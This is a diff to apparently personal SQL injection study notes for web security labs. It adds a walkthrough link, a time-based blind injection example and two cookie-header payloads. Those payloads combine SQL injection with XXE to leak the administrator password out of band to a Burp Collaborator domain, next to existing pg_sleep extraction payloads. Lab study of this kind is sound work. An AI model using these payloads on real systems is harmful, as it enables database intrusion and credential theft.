@@ -42,7 +42,7 @@
 ## Walkthrough - Most Important Labs
 
 - [SQLI with filter WAF bypass via XML encoding using hackvertor extension](sql-waf-bypass-hackvertor.md)
-- [2]()
+- [Blind time condicional sqli](blind-time-conditional-sqli.md) ❗
 - [3]()
 
 ---
@@ -137,6 +137,8 @@ foo'||(select '' from users where rownum= 1)||' -- no error? table user exists
 
 AND 1=CAST((SELECT username FROM users ROWNUM 1) AS int)--
 
+-- EXAMPLE -> TrackingId=test%3b select case when(username='administrator'and length(password)=20)
+
 SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
 SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
 SELECT CASE WHEN (username='administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
@@ -153,7 +155,10 @@ SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE roo
 -- SQLI + XXE OOB -> EXTRACT DATA --
 SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(<OOB_URL_CONCAT_EXPRESSION>)||'.<COLLAB_DOMAIN>/"> %remote;]><root>&remote;</root>'),'/l') FROM dual;
 
+-- EXAMPLES
 Cookie: TrackingId='union SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||'FOO.'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.<BURP-COLAB>/">+%25remote%3b]><root>%26remote%3b</root>'),'/l')+FROM+dual--%3b'; session=uusQnFTiIjfdetXz7v1zm2KKNYqU46MI'
+
+Cookie: TrackingId=a3j0nwT10l24RK9b'union+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(select password from users where username='administrator')||'.mlbzjigg5je1ct8leohiiwd5cwin6du2.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual -- -'
 
 
 -- OOB -> READ FILES 
